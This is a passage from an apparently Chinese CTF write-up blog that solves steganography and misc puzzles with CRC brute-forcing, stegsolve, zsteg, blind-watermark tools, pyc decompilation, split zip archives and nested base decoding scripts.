class="number">0x15b89588</span></span><br><span class="line"><span class="number">4</span> bytes: &#123;<span class="number">0xc9</span>, <span class="number">0xbf</span>, <span class="number">0xd6</span>, <span class="number">0x30</span>&#125;</span><br><span class="line">verification checksum: <span class="number">0x15b89588</span> (OK)</span><br><span class="line">alternative: AKjKcy (OK)</span><br><span class="line">alternative: BVptH1 (OK)</span><br><span class="line">alternative: FRmuIR (OK)</span><br><span class="line">alternative: Ka6j7X (OK)</span><br><span class="line">alternative: ND4JDn (OK)</span><br><span class="line">alternative: SgZWO3 (OK)</span><br><span class="line">alternative: WcGVNP (OK)</span><br><span class="line">alternative: _iQ5Bx (OK)</span><br><span class="line">alternative: bYCMs4 (OK)</span><br><span class="line">alternative: c5qQli (OK)</span><br><span class="line">alternative: d093GV (OK)</span><br><span class="line">alternative: oKFBdr (OK)</span><br><span class="line">alternative: shint6 (OK)</span><br><span class="line">alternative: wltouU (OK)</span><br></pre></td></tr></table></figure><p>之后爆破了许多文件内容，找到可以字符串，输入压缩包密码，拿到txt。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">]cX^r:X\jXiV&#96;jVm\ipV&#96;ek\ijk&#96;e^t</span><br></pre></td></tr></table></figure><p>拿到一串字符串，凯撒暴力破解拿到flag。</p><h3 id="CMP09-Tails"><a href="#CMP09-Tails" class="headerlink" title="CMP09 Tails"></a>CMP09 Tails</h3><p>拿到一个压缩包，压缩包里面一个txt，提示flag不在这里，尝试ntfs隐写。拿到一个pyc文件，进行反编译。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/tools/python-uncompyle6-master/bin$ ./uncompyle6 <span class="number">1.</span>pyc</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;*************&#x27;</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">        s = chr(i ^ ord(flag[i]))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = ord(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = ord(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(str(s))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = [</span><br><span class="line"> <span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;102&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;132&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;112&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;137&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;99&#x27;</span>, <span class="string">&#x27;112&#x27;</span>]</span><br></pre></td></tr></table></figure><p>写解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ciphertext = [<span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;102&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;132&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;112&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;137&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;99&#x27;</span>, <span class="string">&#x27;112&#x27;</span>]</span><br><span class="line">ciphertext = ciphertext[::<span class="number">-1</span>]</span><br><span class="line">print(ciphertext)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> num,key <span class="keyword">in</span> enumerate(ciphertext):</span><br><span class="line">        <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            key = int(key) - <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key = int(key) + <span class="number">10</span></span><br><span class="line">        flag+=chr(num ^ key)</span><br><span class="line">print(flag)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h3 id="FRP14-Watermark2"><a href="#FRP14-Watermark2" class="headerlink" title="FRP14 Watermark2"></a>FRP14 Watermark2</h3><p>盲水印</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bwmforpy3.py decode hui.png  hui_with_wm.png flag.png --oldseed</span><br></pre></td></tr></table></figure><h3 id="FRP13-Watermark"><a href="#FRP13-Watermark" class="headerlink" title="FRP13 Watermark"></a>FRP13 Watermark</h3><p>频域盲水印</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 &#x2F;root&#x2F;桌面&#x2F;steady&#x2F;1.py --original ori.png --image res.png --result out.png</span><br></pre></td></tr></table></figure><h2 id="网题"><a href="#网题" class="headerlink" title="网题"></a>网题</h2><h3 id="杂项-3"><a href="#杂项-3" class="headerlink" title="杂项"></a>杂项</h3><h4 id="男神"><a href="#男神" class="headerlink" title="男神"></a>男神</h4><p>拿到两张图片，想到盲水印，但是先使用stegsolve试试。使用image conbine功能在SUB处发现了二维码，使用扫描工具扫描不出来，这时候想到修补二维码。但是没法修补，再次尝试stegsolve。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/30.png" alt="30"></p><p>将图片保存为bmp，继续使用stegsolve。在Red plane 0、Green plane 0、Blue plane 0分别发现三张二维码，导出，扫描，拿到flag。</p><h4 id="enc"><a href="#enc" class="headerlink" title="enc"></a>enc</h4><p>使用stegsolve，发现Red plane 0全是黑色，于是把Alpha plane 0、Red plane 0、Green plane 0、Blue plane 0都保存下来。分别将Alpha plane 0、Red plane 0、Green plane 0、Blue plane 0另存为 <code>a.png</code>、<code>r.png</code>、<code>g.png</code>、<code>b.png</code>。</p><p>发现用StegSolve打开 <code>a.png</code>，Image Combiner打开 <code>g.png</code>，两者进行的异或运算能得到flag。这里一定要注意打开顺序，先打开a.png，然后在打开g.png。</p><h4 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h4><p>使用zsteg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;套娃# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;套娃&#x2F;2&#x2F;3&#x2F;4&#x2F;5&#x2F;6&#x2F;warmup.bmp&#39;</span><br></pre></td></tr></table></figure><p>没有检测到东西，尝试使用<code>--all</code>参数。</p><p>发现某些编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b1,r,msb,Xy         .. text: <span class="string">&quot;..?. !?.?. ..... ..... ..... ....? .!!?! ..... ..... ..... ....... ..!!! !!?.! ?.?!! !!!!? .!!?! ..... ..?.! ..... .....\n...!. . .?.!. ..... ..?.! ?.?.. ..... .?.!! ?!... .....\n.?.!. ..... ......? .!!!! !.!!! !!!!! !!!!! !!?.! ?.?!!\n!!!!! !?.!! ?!... .....&quot;</span></span><br><span class="line">b1,g,msb,Xy         .. text: <span class="string">&quot;.koO .koO .koO .koO .koO .koO .koO .koO .koO .koO .koO .koO .koOkoO .koO .koO .koO .koO .koO ?koO .koO !koO !koO ?koO\n!koO .koO oO !koO ?koO .koO ?koO .koO .koO .koO .koO\n.koO .koO .koO .koO .O .koO .koO .koO .koO .koO .koO\n.koO .koO .koO .koO .koO ?koO .k&quot;</span></span><br><span class="line">b1,b,msb,Xy         .. text: <span class="string">&quot;[+++ +++&lt;. --.+&gt; ]&lt;+++ &gt;-[++ +&lt;.++ +++++ ++&gt;]&lt; +++++ +&gt;-[+ +++++.- ----. --.-- --&gt;]&lt; ----- -&gt;-[+ +++++ &lt;.+++ +++++ &gt;]&lt;++\n++++&gt; - ----- &gt;]&lt;-- ----&gt; -[+++ +++&lt;. ---.+ ++&gt;]&lt; +++++\n++&gt;-[ +++++ ++&lt;+++&gt; -[+++ ++&lt;.+ +++++ +++++ +&gt;]&lt;+ +++++\n&gt;-[++ ++++&lt; .--.. -----&quot;</span></span><br></pre></td></tr></table></figure><p>但是数据不完整，使用limit参数加长数据。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/31.png" alt="31"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zsteg warmup.bmp b1,r,lsb,xy -l 2048</span><br></pre></td></tr></table></figure><p>分别提取ok、！</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/32.png" alt="32"></p><h4 id="pyflag"><a href="#pyflag" class="headerlink" title="pyflag"></a>pyflag</h4><p>拿到三个图片，发现三个图片中都有PK字样，应该是藏有zip，然后在每个文件的末尾发现了<code>SecretFile/.hint.txt</code>，使用string 挨个查一下。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/tools<span class="formula">$ strings  /home/steady/桌面/tools/Furan.jpg | grep &quot;Secret&quot;</span></span><br><span class="line"><span class="formula">[Secret File Part 2:]</span></span><br><span class="line"><span class="formula">SecretFile/</span></span><br><span class="line"><span class="formula">steady@steady:~/桌面/tools$</span> strings /home/steady/桌面/tools/Setsuna.jpg | grep &quot;Secret&quot;</span><br><span class="line">[Secret File Part 1:]PK</span><br><span class="line">SecretFile/PK</span><br><span class="line">SecretFile/.hint.txt</span><br><span class="line">SecretFile/flag.txt</span><br><span class="line">steady@steady:~/桌面/tools<span class="formula">$ strings  /home/steady/桌面/tools/Miku.jpg | grep &quot;Secret&quot;</span></span><br><span class="line"><span class="formula">[Secret File Part 3:]</span></span><br><span class="line"><span class="formula">SecretFile/.hint.txt</span></span><br><span class="line"><span class="formula">SecretFile/flag.txt</span></span><br></pre></td></tr></table></figure><p>可以看到很明显的标出每个图片是压缩包的第几部分。一开始是找到压缩包的敏感十六进制比如<code>504B0304 </code>，剪贴下来之后发现文件错误，重新观察一下，发现png文件尾部<code>FFD9</code>，后面都会有一串字符串，字符串之后的就是我们的压缩包数据。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/36.png" alt="36"></p><p>Setsuna.jpg，504B0102，很明显是压缩包的头部。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">50 4B 03 04 14 00 00 00 00 00 54 88 6C 50 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 0B 00 00 00 53 65</span><br><span class="line">63 72 65 74 46 69 6C 65 2F 50 4B 03 04 14 00 09</span><br><span class="line">00 08 00 74 86 6C 50 F9 1A 23 EB DF 00 00 00 E3</span><br><span class="line">00 00 00 14 00 00 00 53 65 63 72 65 74 46 69 6C</span><br><span class="line">65 2F 2E 68 69 6E 74 2E 74 78 74 D2 D0 98 8C 59</span><br><span class="line">64 4C 2A 21 4D 96 C0 5F 09 FE 93 67 3A 9D 5D FE</span><br><span class="line">1C C9 8E 6A 97 D9 F3 48 D5 FD 22 F0 36 F6 9F 89</span><br><span class="line">C1 F9 3E A2 00 DC 69 B0 FD 3E 58 3D 20 A3 6F 6B</span><br><span class="line">0A 66 63 EC B8 D9 22 93 63 A4 55 35 28 4C 51 2A</span><br><span class="line">A9 BD A8 86 09 B1 70 E5 52 D0 78 29 3C 95 FD AB</span><br><span class="line">42 97 9A DA E1 63 A9 6F FA 86 CD C9 0B 34 F2 D3</span><br><span class="line">68 1E A8 0F 67 4E 77 9D C6 BC 98 03 22 8D E5 24</span><br><span class="line">F6 3B 3E 93 11 0B 6E 2E 2E FB 38 9A 1F 40 47 A3</span><br><span class="line">D8 63 FD 32 9F AE C9 6A 42 E2 60 A7 5D 78 44 88</span><br><span class="line">1D 21 F4 AC 20 88 2C 51 FD 99 8A 22 31 51 A5 DD</span><br><span class="line">A3 52 4E CD 82 FE 1D 0E 68 D7 B1 2D 6B 10 C5 8B</span><br><span class="line">29 C4 E3 D2 5C AE 86 54 C7 44 65 23 75 3D 42 5A</span><br><span class="line">FD E8 89 3D 70 B8 FB 07 A7 22 1F 1A EC 11 91 48</span><br><span class="line">D2 E0 6C FD EF 09 3D F2 A6 27 50 4B 03 04 14 00</span><br><span class="line">09 00 08 00 0B 87 6C 50 B6 2F 9E CA DF 00 00 00</span><br><span class="line">68 01 00 00 13 00 00 00 53 65 63 72 65 74 46 69</span><br><span class="line">6C 65 2F 66 6C 61 67 2E 74 78 74 19 3A A9 27 82</span><br><span class="line">33 A6 C7 54 5D 93 5F D7 80 8E DB 94 73 47 BE 28</span><br><span class="line">9D 22 38 6A 60 6F 28 B8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Furan.jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">E5 83 02 F6 3A 15 21 55 C7 1E 28 B5 33 55 AA BA</span><br><span class="line">36 46 8C A9 E4 26 D8 9B A9 C3 94 91 53 61 26 C2</span><br><span class="line">EF 38 3B CE CC 5C DF 25 B7 DF 48 5E F3 B8 E1 02</span><br><span class="line">89 1A F2 95 8F 49 52 EE DA BE 11 1B 10 5B 7E 83</span><br><span class="line">0C 4D AB 6A DD 6E 24 18 D5 CE C1 E4 1B 6B 97 36</span><br><span class="line">66 5E 6A 13 41 37 FC CA E0 F6 A5 A7 4A C5 89 AD</span><br><span class="line">12 B2 0A AF BD CB AC 23 04 8C E9 44 3E C8 FE 46</span><br><span class="line">36 2F 8C 36 8C 81 F9 A6 61 9C B2 0E C1 9E B5 93</span><br><span class="line">A6 10 F9 00 DB 24 E5 F3 30 BC 19 EB 67 1C C6 46</span><br><span class="line">83 01 24 25 17 CC E3 84 C7 69 0D 09 04 73 E3 A9</span><br><span class="line">AC 84 57 1B B2 61 32 B0 AE 03 26 C4 A3 6F A3 4C</span><br><span class="line">3F 48 87 FB F0 D1 EC E3 10 F7 35 D8 27 22 DD 56</span><br><span class="line">99 90 50 4B 01 02 14 00 14 00 00 00 00 00 54 88</span><br><span class="line">6C 50 00 00 00 00 00 00 00 00 00 00 00 00 0B 00</span><br><span class="line">24 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00</span><br><span class="line">53 65 63 72 65 74 46 69 6C 65 2F 0A</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Miku.jpg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">18</span> <span class="number">00</span> <span class="number">81</span> <span class="number">37</span> <span class="number">39</span> FB <span class="number">4</span>C</span><br><span class="line">F8 D5 <span class="number">01</span> BB D9 <span class="number">0</span>E FC <span class="number">4</span>C F8 D5 <span class="number">01</span> <span class="number">00</span> <span class="number">2</span>E AD <span class="number">19</span> <span class="number">36</span></span><br><span class="line">F8 D5 <span class="number">01</span> <span class="number">50</span> <span class="number">4</span>B <span class="number">01</span> <span class="number">02</span> <span class="number">14</span> <span class="number">00</span> <span class="number">14</span> <span class="number">00</span> <span class="number">09</span> <span class="number">00</span> <span class="number">08</span> <span class="number">00</span> <span class="number">74</span></span><br><span class="line"><span class="number">86</span> <span class="number">6</span>C <span class="number">50</span> F9 <span class="number">1</span>A <span class="number">23</span> EB DF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> E3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line"><span class="number">00</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">29</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">53</span> <span class="number">65</span> <span class="number">63</span> <span class="number">72</span> <span class="number">65</span> <span class="number">74</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>C <span class="number">65</span> <span class="number">2</span>F <span class="number">2</span>E <span class="number">68</span> <span class="number">69</span> <span class="number">6</span>E</span><br><span class="line"><span class="number">74</span> <span class="number">2</span>E <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">0</span>A <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">18</span></span><br><span class="line"><span class="number">00</span> A7 <span class="number">8</span>A <span class="number">4</span>F <span class="number">71</span> <span class="number">4</span>B F8 D5 <span class="number">01</span> A8 <span class="number">8</span>A <span class="number">4</span>F <span class="number">71</span> <span class="number">4</span>B F8 D5</span><br><span class="line"><span class="number">01</span> <span class="number">00</span> B0 <span class="number">20</span> A8 <span class="number">34</span> F8 D5 <span class="number">01</span> <span class="number">50</span> <span class="number">4</span>B <span class="number">01</span> <span class="number">02</span> <span class="number">14</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line"><span class="number">00</span> <span class="number">09</span> <span class="number">00</span> <span class="number">08</span> <span class="number">00</span> <span class="number">0</span>B <span class="number">87</span> <span class="number">6</span>C <span class="number">50</span> B6 <span class="number">2</span>F <span class="number">9</span>E CA DF <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">68</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">13</span> <span class="number">00</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">80</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">3</span>A <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">53</span> <span class="number">65</span> <span class="number">63</span> <span class="number">72</span> <span class="number">65</span> <span class="number">74</span> <span class="number">46</span> <span class="number">69</span> <span class="number">6</span>C</span><br><span class="line"><span class="number">65</span> <span class="number">2</span>F <span class="number">66</span> <span class="number">6</span>C <span class="number">61</span> <span class="number">67</span> <span class="number">2</span>E <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">0</span>A <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">18</span> <span class="number">00</span> <span class="number">40</span> <span class="number">15</span> <span class="number">26</span> <span class="number">1</span>A <span class="number">4</span>C F8 D5 <span class="number">01</span> <span class="number">02</span> <span class="number">55</span></span><br><span class="line"><span class="number">86</span> B3 <span class="number">4</span>C F8 D5 <span class="number">01</span> <span class="number">63</span> FE <span class="number">25</span> <span class="number">1</span>A <span class="number">4</span>C F8 D5 <span class="number">01</span> <span class="number">50</span> <span class="number">4</span>B</span><br><span class="line"><span class="number">05</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span> <span class="number">28</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">4</span>A <span class="number">02</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后尝试弱口令解压压缩包，密码是1234。解压之后拿到文本信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我用各种baseXX编码把flag套娃加密了，你应该也有看出来。</span><br><span class="line">但我只用了一些常用的base编码哦，毕竟我的智力水平你也知道...像什么base36base58听都没听过</span><br><span class="line">提示：<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x30</span>,<span class="number">0x55</span></span><br></pre></td></tr></table></figure><p>hint已经提示了使用base16,32,64,85的编码。</p><p>使用脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baseDec</span>(<span class="params">text,type</span>):</span></span><br><span class="line">    <span class="keyword">if</span> type == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b16decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b32decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b64decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b85decode(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&quot;^[0-9A-F=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&quot;^[A-Z2-7=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&quot;^[A-Za-z0-9+/=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoDec</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;MRCTF&#123;&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">            print(<span class="string">&quot;\n&quot;</span>+text.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        code = detect(text)</span><br><span class="line">        text = baseDec(text,code)</span><br><span class="line">flag=<span class="string">b&quot;G&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)&quot;</span></span><br><span class="line">autoDec(flag)</span><br></pre></td></tr></table></figure><h4 id="不眠之夜"><a href="#不眠之夜" class="headerlink" title="不眠之夜"></a>不眠之夜</h4><p>拿到许多图片，每个图片有红色的字体，想到拼接图片。</p><p>使用kali工具。</p><p>随机拼接图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/不眠夜之WA<span class="comment"># montage *jpg -tile 10x12 -geometry 200x100+0+0 out.jpg</span></span><br><span class="line">montage: Not a JPEG file: starts <span class="keyword">with</span> <span class="number">0x00</span> <span class="number">0x00</span> `<span 